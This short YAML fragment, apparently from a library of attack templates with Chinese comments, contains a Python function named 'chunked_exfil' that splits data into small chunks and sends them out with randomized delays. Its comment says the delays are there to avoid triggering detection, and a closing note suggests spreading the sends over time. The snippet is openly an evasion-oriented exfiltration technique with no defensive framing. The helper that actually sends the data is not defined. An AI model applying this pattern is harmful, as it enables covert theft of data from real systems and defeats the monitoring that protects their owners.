# 分段传输策略
chunked_transfer:
  - template: |
      # 分段传输策略

      # 1. 小数据量分段

      def chunked_exfil(data, chunk_size=100, delay=5):
          """分段外带"""
          chunks = [data[i:i+chunk_size]
                    for i in range(0, len(data), chunk_size)]

          for i, chunk in enumerate(chunks):
              # 发送分段
              send_chunk(chunk, i)
              # 等待避免触发检测
              sleep(delay + random.randint(0, 10))

      # 2. 时间分散

      # 在不同时间发送不同分段
